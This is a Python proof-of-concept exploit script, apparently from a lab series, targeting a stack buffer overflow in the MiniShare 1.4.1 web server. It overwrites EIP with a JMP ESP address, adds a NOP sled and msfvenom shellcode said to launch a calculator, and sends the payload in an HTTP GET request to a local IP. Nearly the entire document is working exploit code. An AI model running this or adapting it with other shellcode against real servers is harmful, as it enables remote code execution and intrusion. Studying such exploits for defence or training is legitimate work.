#!/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 7 of proof of concept by Vry4n
# This script is intended full the buffer, modify EIP value with our JMP ESP value 7E4456F7, which refers to USER32.dll
# execute it, and then fill it with our code generated with msfvenom to spawn a calculator

# badchars \x00\x0d
# JMP ESP 7E4456F7, as this is intel processor this is read as little endian, see EIP variable from lest significant bit
import socket

# buffer 1787
# NOPs are ncessary to separate our code with the register EIP
FUZZ = "A" * 1787
EIP =  b"\xF7\x56\x44\x7E"
NOPS = b"\x90" * 32
calc =  b""
calc += b"\xda\xc6\xd9\x74\x24\xf4\xb8\xea\xab\xb5\xbc\x5e\x33"
calc += b"\xc9\xb1\x31\x83\xc6\x04\x31\x46\x14\x03\x46\xfe\x49"
calc += b"\x40\x40\x16\x0f\xab\xb9\xe6\x70\x25\x5c\xd7\xb0\x51"
calc += b"\x14\x47\x01\x11\x78\x6b\xea\x77\x69\xf8\x9e\x5f\x9e"
calc += b"\x49\x14\x86\x91\x4a\x05\xfa\xb0\xc8\x54\x2f\x13\xf1"
calc += b"\x96\x22\x52\x36\xca\xcf\x06\xef\x80\x62\xb7\x84\xdd"
calc += b"\xbe\x3c\xd6\xf0\xc6\xa1\xae\xf3\xe7\x77\xa5\xad\x27"
calc += b"\x79\x6a\xc6\x61\x61\x6f\xe3\x38\x1a\x5b\x9f\xba\xca"
calc += b"\x92\x60\x10\x33\x1b\x93\x68\x73\x9b\x4c\x1f\x8d\xd8"
calc += b"\xf1\x18\x4a\xa3\x2d\xac\x49\x03\xa5\x16\xb6\xb2\x6a"
calc += b"\xc0\x3d\xb8\xc7\x86\x1a\xdc\xd6\x4b\x11\xd8\x53\x6a"
calc += b"\xf6\x69\x27\x49\xd2\x32\xf3\xf0\x43\x9e\x52\x0c\x93"
calc += b"\x41\x0a\xa8\xdf\x6f\x5f\xc1\xbd\xe5\x9e\x57\xb8\x4b"
calc += b"\xa0\x67\xc3\xfb\xc9\x56\x48\x94\x8e\x66\x9b\xd1\x61"
calc += b"\x2d\x86\x73\xea\xe8\x52\xc6\x77\x0b\x89\x04\x8e\x88"
calc += b"\x38\xf4\x75\x90\x48\xf1\x32\x16\xa0\x8b\x2b\xf3\xc6"
calc += b"\x38\x4b\xd6\xa4\xdf\xdf\xba\x04\x7a\x58\x58\x59"

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.5", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + EIP + NOPS + calc + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()